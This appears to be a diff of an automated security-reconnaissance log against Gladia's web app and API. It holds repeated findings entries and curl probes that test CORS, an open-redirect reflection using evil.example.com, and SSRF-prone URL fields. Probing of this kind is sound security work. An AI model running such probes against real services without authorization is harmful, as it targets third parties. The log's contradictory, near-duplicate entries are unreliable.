+- 2026-08-08 REJECTED OATH @ app.gladia.io: redirect_to is NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback → no OAuth code/state theft via redirect_to; narrows finding to post-auth honoring only
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: CSP directive set verified fresh — base-uri 'self', object-src 'none', frame-src 'self'+allowlist; form-action directive ABSENT → unconstrained form-action reflection (CSP gap confirmed, not an oversight)
+- 2026-08-08 CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org + /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html (SPA catch-all) — no real authenticated API lives on app host; server-side 302 gate intact on /apikeys,/transcriptions,/settings (return-to cookie tamper-reset confirmed)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 11 cycles (23:08→11:36 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 11 cycles (23:08→13:10 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 13:10 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; CSP lacks form-action; post-auth honoring still AUTH_HELPED
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — shasum cc96f84a… unchanged, repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 13:10 UTC)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 12 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), @gladiaio/sdk@1.1.0 static (fresh this cycle)
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: Orphaned impersonation confirmed fresh — src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter (diverges from official SDK's token-after-init POST /v2/live flow), sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 stable, dist-tag latest persists while source repo+user 404 (fresh 13:10 UTC probe)
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: /openapi.json spec confirms audio_url/video_url/callback_url as format:uri with NO scheme allowlist on /v2/pre-recorded — gated only by key (401 confirmed on POST without key, NestJS HttpException shape, fresh 13:10 UTC)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT at 13:10 UTC — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by, CORS static wildcard — 12th cycle confirmed frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection persists — form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com", CSRF lacks form-action directive verified (fresh 11:36 UTC → 13:10 UTC stable)
+- 2026-08-08 CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org & /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html SPA catch-all; real server-side 302 gate intact only on /apikeys,/transcriptions,/settings with return-to cookie tamper-reset — no authenticated API endpoints exposed at unauth layer
+- 2026-08-08 REJECTED OATH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (confirmed at 11:36 UTC)
+- 2026-08-08 REJECTED MISCONFIG @ app.gladia.io: return-to cookie tampering does NOT lead to open redirect — server resets tampered value to {"url":"/"} (REJECTED, confirmed multiple cycles)
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT across 12 cycles (23:08→13:10 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed — shasum cc96f84a… unchanged, repo alexisbouchez/gladia.ts + user 404 while dist-tag latest persists (fresh 13:25 UTC reposcan)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 13 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists — dist-tag latest=0.1.3, shasum `cc96f84a…` + integrity stable, repo alexisbouchez/gladia.ts + user 404 (orphaned), @gladiaio/sdk@1.1.0 static (fresh this cycle)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: 14:02 UTC fresh probe byte-identical to 13:10 UTC (openapi 125131B/14 paths, /health 15B no x-powered-by on GET, /v1/models 530B) — 13th NO_DRIFT cycle, surface frozen.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 14:02 UTC (200, form action reflects URL-encoded value) — no host allowlist at unauth layer; post-auth honoring sole unverified gate.
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: CSP verified fresh — base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; form-action reflection unconstrained.
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: 14:02 UTC fresh probe byte-identical to 13:10 UTC — 13th NO_DRIFT cycle, surface frozen
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 14:02 UTC — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 14 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive 14:48 UTC — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: 14:02 UTC fresh probe byte-identical to 13:10 UTC — 13th NO_DRIFT cycle, surface frozen.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 14:02 UTC — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate.
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: CSP verified — base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; form-action reflection unconstrained (gap confirmed).
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation stable — sha256 `3b23ec7d…7f2` unchanged, repo alexisbouchez/gladia.ts + user 404, src/client.ts:307 embeds raw key in wss URL query, @gladiaio/sdk@1.1.0 static.
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec confirms audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models confirms FR/US egress; key-gated 401 — SSRF-by-design persists (AUTH_HELPED).
+- 2026-08-08 REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=http://app.gladia.io/auth/google/callback; no OAuth code/state theft path.
+- 2026-08-08 REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft via redirect_to
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: fresh probe confirms NO_DRIFT (15th cycle) — openapi 125131B/14 paths, /health `{"health":"OK"}`, /v1/models 530B, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static `*` + ACAH x-gladia-key — surface frozen.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh — form action reflects URL-encoded value; no host allowlist at unauth layer; CSP lacks form-action directive (gap confirmed, not an oversight).
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 SPA shell without auth — client-side enforcement; server-side 302 gate intact on /apikeys,/transcriptions,/settings.
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec unchanged (15th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models confirms FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only.
+- 2026-08-08 REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed).
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 15 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 16 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen, nothing new to report
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 15+ cycles (23:08→17:0x UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static `*` + ACAH x-gladia-key — surface frozen, nothing new to report.
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation re-verified fresh 17:0x UTC — sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2` unchanged, dist-tag latest=0.1.3, repo `alexisbouchez/gladia.ts` + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:306–307 appends raw `x-gladia-key` to `wss://api.gladia.io/v2/live` URL query.
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:0x UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate.
+- 2026-08-08 REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:0x UTC).
+=== INVENTORY gladia ===
+# Inventory: gladia
+
+## Seed 2026-08-07 (passive recon)
+
+### Hosts
+- gladia.io -> 301 https://www.gladia.io/ (Vercel front; HSTS 63072000)
+[0m
+[0m✗ [0mRead score failed
+[91m[1mError: [0mFile not found: /home/runner/work/gladia-hunt/gladia-hunt/score
+[0m
+[0m$ [0mecho "=== api.gladia.io /health ===" && curl -sS -I -m 10 https://api.gladia.io/health 2>&1 | head -15 && echo "" && echo "=== api.gladia.io /openapi.json headers ===" && curl -sS -I -m 10 https://api.gladia.io/openapi.json 2>&1 | grep -iE "HTTP|content-length|content-type|access-control|strict-transport|x-powered" && echo "" && echo "=== /openapi.json size ===" && curl -sS -m 10 https://api.gladia.io/openapi.json 2>&1 | wc -c
+=== api.gladia.io /health ===
+HTTP/2 200 
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+content-type: application/json; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Sat, 08 Aug 2026 17:44:42 GMT
+etag: W/"f-zkBsEbirArjpKvVbiSV3QbfXWrg"
+origin-agent-cluster: ?1
+referrer-policy: strict-origin-when-cross-origin
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+x-content-type-options: nosniff
+x-dns-prefetch-control: off
+x-download-options: noopen
+x-permitted-cross-domain-policies: none
+x-xss-protection: 0
+
+=== api.gladia.io /openapi.json headers ===
+HTTP/2 200 
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+content-type: application/json; charset=utf-8
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+x-content-type-options: nosniff
+content-length: 125131
+
+=== /openapi.json size ===
+125131
+[0m
+[0m$ [0mecho "=== /v1/models ===" && curl -sS -I -m 10 https://api.gladia.io/v1/models 2>&1 | grep -iE "HTTP|content-length|access-control|content-type" && echo "" && echo "=== /v2/pre-recorded OPTIONS ===" && curl -sS -D - -o /dev/null -m 10 -X OPTIONS -H "Origin: https://evil.test" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/pre-recorded 2>&1 | grep -iE "HTTP|x-powered|access-control|allow" && echo "" && echo "=== /v2/pre-recorded POST (no key) ===" && curl -sS -D - -o /dev/null -m 10 -X POST -H "Content-Type: application/json" -d '{"audio_url":"http://example.com"}' https://api.gladia.io/v2/pre-recorded 2>&1 | grep -iE "HTTP|x-powered|access-control"
+=== /v1/models ===
+HTTP/2 200 
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+content-type: application/json; charset=utf-8
+x-content-type-options: nosniff
+content-length: 530
+
+=== /v2/pre-recorded OPTIONS ===
+HTTP/2 204 
+access-control-allow-headers: x-gladia-key
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+vary: Access-Control-Request-Headers
+x-powered-by: Express
+
+=== /v2/pre-recorded POST (no key) ===
+HTTP/2 401 
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+[0m
+Let me run fresh passive probes to verify the current surface state before producing the analysis.
+[0m$ [0mecho "=== app.gladia.io /signin?redirect_to= ===" && curl -sS -D - -m 10 "https://app.gladia.io/signin?redirect_to=https://evil.example.com" 2>&1 | grep -iE "HTTP|content-type|content-length|set-cookie|location|strict-transport|content-security" | head -10 && echo "" && echo "=== form action reflection ===" && curl -sS -m 10 "https://app.gladia.io/signin?redirect_to=https://evil.example.com" 2>&1 | grep -oi 'action="[^"]*"' && echo "" && echo "=== app CSP header ===" && curl -sS -D - -o /dev/null -m 10 "https://app.gladia.io/signin?redirect_to=https://evil.example.com" 2>&1 | grep -i "content-security"
+=== app.gladia.io /signin?redirect_to= ===
+HTTP/2 200 
+content-security-policy: default-src 'self'; connect-src 'self' https://*.gladia.io wss://*.gladia.io https://*.google.com https://*.google-analytics.com https://*.googletagmanager.com https://*.analytics.google.com https://*.g.doubleclick.net https://pagead2.googlesyndication.com https://*.google.com https://*.google.ad https://*.google.ae https://*.google.com.af https://*.google.com.ag https://*.google.al https://*.google.am https://*.google.co.ao https://*.google.com.ar https://*.google.as https://*.google.at https://*.google.com.au https://*.google.az https://*.google.ba https://*.google.com.bd https://*.google.be https://*.google.bf https://*.google.bg https://*.google.com.bh https://*.google.bi https://*.google.bj https://*.google.com.bn https://*.google.com.bo https://*.google.com.br https://*.google.bs https://*.google.bt https://*.google.co.bw https://*.google.by https://*.google.com.bz https://*.google.ca https://*.google.cd https://*.google.cf https://*.google.cg https://*.google.ch https://*.google.ci https://*.google.co.ck https://*.google.cl https://*.google.cm https://*.google.cn https://*.google.com.co https://*.google.co.cr https://*.google.com.cu https://*.google.cv https://*.google.com.cy https://*.google.cz https://*.google.de https://*.google.dj https://*.google.dk https://*.google.dm https://*.google.com.do https://*.google.dz https://*.google.com.ec https://*.google.ee https://*.google.com.eg https://*.google.es https://*.google.com.et https://*.google.fi https://*.google.com.fj https://*.google.fm https://*.google.fr https://*.google.ga https://*.google.ge https://*.google.gg https://*.google.com.gh https://*.google.com.gi https://*.google.gl https://*.google.gm https://*.google.gr https://*.google.com.gt https://*.google.gy https://*.google.com.hk https://*.google.hn https://*.google.hr https://*.google.ht https://*.google.hu https://*.google.co.id https://*.google.ie https://*.google.co.il https://*.google.im https://*.google.co.in https://*.google.iq https://*.google.is https://*.google.it https://*.google.je https://*.google.com.jm https://*.google.jo https://*.google.co.jp https://*.google.co.ke https://*.google.com.kh https://*.google.ki https://*.google.kg https://*.google.co.kr https://*.google.com.kw https://*.google.kz https://*.google.la https://*.google.com.lb https://*.google.li https://*.google.lk https://*.google.co.ls https://*.google.lt https://*.google.lu https://*.google.lv https://*.google.com.ly https://*.google.co.ma https://*.google.md https://*.google.me https://*.google.mg https://*.google.mk https://*.google.ml https://*.google.com.mm https://*.google.mn https://*.google.com.mt https://*.google.mu https://*.google.mv https://*.google.mw https://*.google.com.mx https://*.google.com.my https://*.google.co.mz https://*.google.com.na https://*.google.com.ng https://*.google.com.ni https://*.google.ne https://*.google.nl https://*.google.no https://*.google.com.np https://*.google.nr https://*.google.nu https://*.google.co.nz https://*.google.com.om https://*.google.com.pa https://*.google.com.pe https://*.google.com.pg https://*.google.com.ph https://*.google.com.pk https://*.google.pl https://*.google.pn https://*.google.com.pr https://*.google.ps https://*.google.pt https://*.google.com.py https://*.google.com.qa https://*.google.ro https://*.google.ru https://*.google.rw https://*.google.com.sa https://*.google.com.sb https://*.google.sc https://*.google.se https://*.google.com.sg https://*.google.sh https://*.google.si https://*.google.sk https://*.google.com.sl https://*.google.sn https://*.google.so https://*.google.sm https://*.google.sr https://*.google.st https://*.google.com.sv https://*.google.td https://*.google.tg https://*.google.co.th https://*.google.com.tj https://*.google.tl https://*.google.tm https://*.google.tn https://*.google.to https://*.google.com.tr https://*.google.tt https://*.google.com.tw https://*.google.co.tz https://*.google.com.ua https://*.google.co.ug https://*.google.co.uk https://*.google.com.uy https://*.google.co.uz https://*.google.com.vc https://*.google.co.ve https://*.google.co.vi https://*.google.com.vn https://*.google.vu https://*.google.ws https://*.google.rs https://*.google.co.za https://*.google.co.zm https://*.google.co.zw https://*.google.cat https://*.hubapi.com https://*.hubspot.com https://*.hscollectedforms.net https://*.hsforms.com https://*.hotjar.com https://*.contentsquare.net https://*.hotjar.io wss://*.hotjar.com https://*.axept.io https://*.axeptio.eu https://*.axeptio.tech; frame-src 'self' https://gladia.io https://*.gladia.io https://*.googletagmanager.com https://pagead2.googlesyndication.com https://www.googleadservices.com https://googleads.g.doubleclick.net https://*.hyperline.co https://billing.gladia.io/portal https://app.svix.com/ https://*.hs-scripts.com https://*.hs-analytics.net https://*.hsadspixel.net https://*.hscollectedforms.net https://*.hs-banner.com https://*.hubspot.com https://*.hotjar.com https://*.contentsquare.net; worker-src 'self' blob:; media-src 'self' data: blob:; script-src 'self' 'nonce-0d546de09133f261d9ad799d1902aaf8' 'strict-dynamic' https://*.googletagmanager.com https://*.googleadservices.com https://*.pagead2.googlesyndication.com https://googleads.g.doubleclick.net https://*.hotjar.com https://*.contentsquare.net https://*.axept.io; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://*.hotjar.com; img-src 'self' data: https://*.googletagmanager.com https://*.google-analytics.com https://*.g.doubleclick.net https://*.google.com https://*.google.fr https://*.google.com https://*.google.ad https://*.google.ae https://*.google.com.af https://*.google.com.ag https://*.google.al https://*.google.am https://*.google.co.ao https://*.google.com.ar https://*.google.as https://*.google.at https://*.google.com.au https://*.google.az https://*.google.ba https://*.google.com.bd https://*.google.be https://*.google.bf https://*.google.bg https://*.google.com.bh https://*.google.bi https://*.google.bj https://*.google.com.bn https://*.google.com.bo https://*.google.com.br https://*.google.bs https://*.google.bt https://*.google.co.bw https://*.google.by https://*.google.com.bz https://*.google.ca https://*.google.cd https://*.google.cf https://*.google.cg https://*.google.ch https://*.google.ci https://*.google.co.ck https://*.google.cl https://*.google.cm https://*.google.cn https://*.google.com.co https://*.google.co.cr https://*.google.com.cu https://*.google.cv https://*.google.com.cy https://*.google.cz https://*.google.de https://*.google.dj https://*.google.dk https://*.google.dm https://*.google.com.do https://*.google.dz https://*.google.com.ec https://*.google.ee https://*.google.com.eg https://*.google.es https://*.google.com.et https://*.google.fi https://*.google.com.fj https://*.google.fm https://*.google.fr https://*.google.ga https://*.google.ge https://*.google.gg https://*.google.com.gh https://*.google.com.gi https://*.google.gl https://*.google.gm https://*.google.gr https://*.google.com.gt https://*.google.gy https://*.google.com.hk https://*.google.hn https://*.google.hr https://*.google.ht https://*.google.hu https://*.google.co.id https://*.google.ie https://*.google.co.il https://*.google.im https://*.google.co.in https://*.google.iq https://*.google.is https://*.google.it https://*.google.je https://*.google.com.jm https://*.google.jo https://*.google.co.jp https://*.google.co.ke https://*.google.com.kh https://*.google.ki https://*.google.kg https://*.google.co.kr https://*.google.com.kw https://*.google.kz https://*.google.la https://*.google.com.lb https://*.google.li https://*.google.lk https://*.google.co.ls https://*.google.lt https://*.google.lu https://*.google.lv https://*.google.com.ly https://*.google.co.ma https://*.google.md https://*.google.me https://*.google.mg https://*.google.mk https://*.google.ml https://*.google.com.mm https://*.google.mn https://*.google.com.mt https://*.google.mu https://*.google.mv https://*.google.mw https://*.google.com.mx https://*.google.com.my https://*.google.co.mz https://*.google.com.na https://*.google.com.ng https://*.google.com.ni https://*.google.ne https://*.google.nl https://*.google.no https://*.google.com.np https://*.google.nr https://*.google.nu https://*.google.co.nz https://*.google.com.om https://*.google.com.pa https://*.google.com.pe https://*.google.com.pg https://*.google.com.ph https://*.google.com.pk https://*.google.pl https://*.google.pn https://*.google.com.pr https://*.google.ps https://*.google.pt https://*.google.com.py https://*.google.com.qa https://*.google.ro https://*.google.ru https://*.google.rw https://*.google.com.sa https://*.google.com.sb https://*.google.sc https://*.google.se https://*.google.com.sg https://*.google.sh https://*.google.si https://*.google.sk https://*.google.com.sl https://*.google.sn https://*.google.so https://*.google.sm https://*.google.sr https://*.google.st https://*.google.com.sv https://*.google.td https://*.google.tg https://*.google.co.th https://*.google.com.tj https://*.google.tl https://*.google.tm https://*.google.tn https://*.google.to https://*.google.com.tr https://*.google.tt https://*.google.com.tw https://*.google.co.tz https://*.google.com.ua https://*.google.co.ug https://*.google.co.uk https://*.google.com.uy https://*.google.co.uz https://*.google.com.vc https://*.google.co.ve https://*.google.co.vi https://*.google.com.vn https://*.google.vu https://*.google.ws https://*.google.rs https://*.google.co.za https://*.google.co.zm https://*.google.co.zw https://*.google.cat https://googleads.g.doubleclick.net https://pagead2.googlesyndication.com https://www.googleadservices.com https://*.hsforms.com https://*.hubspot.com https://*.hotjar.com https://*.contentsquare.net https://axeptio.imgix.net https://*.axept.io https://*.gstatic.com; font-src 'self' fonts.gstatic.com https://*.hotjar.com; object-src 'none'; base-uri 'self';
+content-type: text/html; charset=utf-8
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="dark"/><title>Gladia</title><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="icon" type="image/svg+xml" href="/favicon.svg"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="alternate icon" type="image/png" href="/favicons/android-chrome-192x192.png"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="apple-touch-icon" href="/favicons/apple-touch-icon.png"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="manifest" href="/site.webmanifest" crossorigin="use-credentials"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="preconnect" href="https://fonts.googleapis.com"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>Gladia | Sign in</title><link rel="modulepreload" href="/assets/entry.client-BOHuV7Pj.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/jsx-runtime-u17CrQMm.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/components-DUTgi2q6.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/en-DvLSrjYu.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/errorBoundaries-BziFktkY.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/index-CBoJQWs5.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/index-B9GFzMmk.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/i18n-C3JOyqxk.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/util-x7g5cCpw.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/preload-helper-BXl3LOEh.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/root-CSBghsej.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/root-DSZo80Vq.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/lib-CoATexri.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/schemas-D5cmvACT.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/gtm-CQTxuEbw.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/Alert-BGjXwa6V.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/GeneralErrorBoundary-D2PfLWTB.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/layout-fgA_iDCk.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/Layout-CX7WKhJl.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/signin-Cp6uXF4c.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/TextField-BHsNpJcq.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/Brand-D6aoaEYo.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/FormError-DyffWlUD.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/schemas-CPQuYd7Q.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/helpers-BTbTAEGI.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/parse-CUsPfS31.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/Field-8wr6fkPO.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/Badge-DsSsokMn.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/RSPContexts-B867fqW_.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/useTextField-CcnuE0sQ.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link rel="modulepreload" href="/assets/useField-D6pT4_EQ.js" nonce="0d546de09133f261d9ad799d1902aaf8"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,100..700;1,100..700&amp;display=swap"/><link nonce="0d546de09133f261d9ad799d1902aaf8" rel="stylesheet" href="/assets/tailwind-CHmKW_mh.css"/><script nonce="0d546de09133f261d9ad799d1902aaf8">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-N7XJQJG');</script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N7XJQJG" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div class="h-full lg:flex bg-bg-primary"><main class="basis-1/2 flex flex-col items-center h-full overflow-y-auto"><form id="form" noValidate="" class="my-auto py-12 max-w-[22.5rem] w-full flex flex-col gap-6" data-discover="true" action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" method="post"><div class="flex flex-col gap-4"><a href="https://gladia.io" target="_blank" rel="noopener noreferrer"><svg width="127" height="32" viewBox="0 0 127 32" xmlns="http://www.w3.org/2000/svg" class="place-self-start"><path d="M16.5283 20.7373C18.5682 20.7373 20.5247 21.5482 21.9678 22.9912L27.5586 29.4883H24.3018C23.4579 29.4883 22.6544 29.1249 22.0967 28.4902L17.4658 23.2168V32H14.3633V23.4062L9.90039 28.4893C9.34393 29.1225 8.54027 29.4873 7.69531 29.4873H4.43652L10.0303 22.9893C11.4734 21.5463 13.4308 20.7354 15.4707 20.7354H16.5283V20.7373ZM9.00977 10.0332C10.4528 11.4762 11.2637 13.4329 11.2637 15.4727V16.5303C11.2636 18.57 10.4529 20.5267 9.00977 21.9697L2.51172 27.5596V24.3027L2.51074 24.3018C2.51074 23.458 